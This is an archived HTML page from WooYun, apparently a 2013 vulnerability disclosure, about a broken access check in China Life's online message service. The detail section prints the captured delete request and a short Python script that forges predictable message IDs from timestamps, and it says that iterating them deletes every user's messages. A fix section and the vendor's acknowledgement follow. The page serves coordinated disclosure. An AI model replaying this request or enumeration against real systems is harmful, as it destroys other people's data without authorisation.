@@ -1,0 +1,238 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		中国人寿平衡权限+信息ID被破解导致删除任意用户数据  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		中国人寿平衡权限+信息ID被破解导致删除任意用户数据  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/xfkxfk">xfkxfk</a> 
+</li><li>提交时间：		2013-08-12 16:26</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-08-12：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-08-12：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-08-22：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-09-01：	细节向普通白帽子公开<br/>
+									2013-09-11：	细节向实习白帽子公开<br/>
+									2013-09-26：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">中国人寿某处平衡权限，加上信息ID被破解，构造ID并遍历后，导致可以删除任意用户数据。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">这里我们拿两个用户进行测试。<br />
+<br />
+先看看用户251362931@qq.com的留言信息，留言ID：137627320480720130812100644：<br />
+<br />
+</p><p class="detail"><a href="../images/1213395725ee5e9fe64d1facb145bcb6707f9b1e.png" target="_blank"><img src="../images/1213395725ee5e9fe64d1facb145bcb6707f9b1e.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+然后再来看看用户251251251@qq.com的留言信息，留言ID：137627318119420130812100621：<br />
+<br />
+</p><p class="detail"><a href="../images/12134051fb323ef6f9994f7e85c1758da7d7d607.png" target="_blank"><img src="../images/12134051fb323ef6f9994f7e85c1758da7d7d607.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+下面我们先来删除用户251251251@qq.com的留言信息，留言ID：137627318119420130812100621，然后我们抓个包看看，请求的参数有哪些：<br />
+<br />
+</p><pre><code>POST /serviceonline/self-service/zaixianliuyan/deleteInfo.jsp HTTP/1.1<br />
+Host: www.e-chinalife.com<br />
+Proxy-Connection: keep-alive<br />
+Content-Length: 65<br />
+Accept: */*<br />
+Origin: http://www.e-chinalife.com<br />
+X-Requested-With: XMLHttpRequest<br />
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.95 Safari/537.36<br />
+Content-Type: application/x-www-form-urlencoded<br />
+Referer: http://www.e-chinalife.com/serviceonline/self-service/zaixianliuyan/consultation_login.jsp<br />
+Accept-Encoding: gzip,deflate,sdch<br />
+Accept-Language: zh-CN,zh;q=0.8<br />
+Cookie: eservice=xTbZSL7L8Vw4g**************************RvlmsX6dPdGD!-546834120<br />
+<br />
+ecno=1376271645658&amp;serviceid=137627318119420130812100621&amp;status=1</code></pre><p class='detail'><br />
+<br />
+这里有ecno和serviceid两个主要的参数：<br />
+<br />
+</p><p class="detail"><a href="../images/12134518e2e99e1e3994cadc8815c9db0eae28d1.png" target="_blank"><img src="../images/12134518e2e99e1e3994cadc8815c9db0eae28d1.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+这里的ecno参数可以不要，只是为了区分那个地区的，我主要的参数是serviceid，下面分析一下这留言信息serviceid的构造：<br />
+<br />
+他是由27个数字组成，前13个是时间戳，后14个这个时间戳的年月日时分秒格式的时间。所以，只要我们遍历一下时间戳id，然后利用下面代码构造出这个serviceid就ok了。<br />
+<br />
+</p><pre><code>import time<br />
+<br />
+id=&#039;1376273204807&#039;<br />
+<br />
+tmp_time = float(id[0:10] + &#039;.&#039; + id[10:])<br />
+<br />
+date = time.strftime(&#039;%Y-%m-%d %H:%M:%S&#039;, time.gmtime(tmp_time))<br />
+<br />
+date_str = date[0:4]+date[5:7]+date[8:10]+str(int(date[11:13])+8)+date[14:16]+date[17:]<br />
+<br />
+serviceid = id + date_str<br />
+<br />
+print &quot;serviceid=%s&quot; % serviceid</code></pre><p class='detail'><br />
+<br />
+通过上面分析，我们在删除留言信息时，抓包，把ecno参数删掉，把serviceid参数的值换成用户251362931@qq.com的留言信息，留言ID：137627320480720130812100644：<br />
+<br />
+</p><p class="detail"><a href="../images/12135143cfa6645b29b3cc69cd4221400c6ab929.png" target="_blank"><img src="../images/12135143cfa6645b29b3cc69cd4221400c6ab929.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+然后确定删除：<br />
+<br />
+</p><p class="detail"><a href="../images/12135157780c5866b038933d8c3c58b56b056192.png" target="_blank"><img src="../images/12135157780c5866b038933d8c3c58b56b056192.png" alt="4-1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/121352058d1572f408c55e38319d654c909aabf3.png" target="_blank"><img src="../images/121352058d1572f408c55e38319d654c909aabf3.png" alt="4-2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+最后用户251362931@qq.com的留言信息，留言ID：137627320480720130812100644的留言就被删掉了。<br />
+<br />
+看看是否删除成功：<br />
+<br />
+</p><p class="detail"><a href="../images/1213523358b11973813e1229e5335fabca1d68cf.png" target="_blank"><img src="../images/1213523358b11973813e1229e5335fabca1d68cf.png" alt="5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+用户251362931@qq.com的留言信息，留言ID：137627320480720130812100644被删除。<br />
+<br />
+</p><p class="detail"><a href="../images/121353043a47746388ba044391a8f76ed78df869.png" target="_blank"><img src="../images/121353043a47746388ba044391a8f76ed78df869.png" alt="6.png" width="600"/></a></p><p class="detail"><br />
+<br />
+原本用户251251251@qq.com的留言信息，留言ID：137627318119420130812100621依然在，没有删除。<br />
+<br />
+这样我们只要遍历时间戳（time.time()），利用上面代码构造serviceid，就能删除所有用户的留言信息。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">控制权限，用户只能删除自己的留言信息。<br />
+<br />
+留言信息ID不可逆，不要被破解出来，导致操作全部信息。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/xfkxfk" title="xfkxfk">xfkxfk</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-034163" title="中国人寿平衡权限+信息ID被破解导致删除任意用户数据">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-08-12 17:39</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您对中国人寿信息安全的帮助，谢谢。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="34163";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
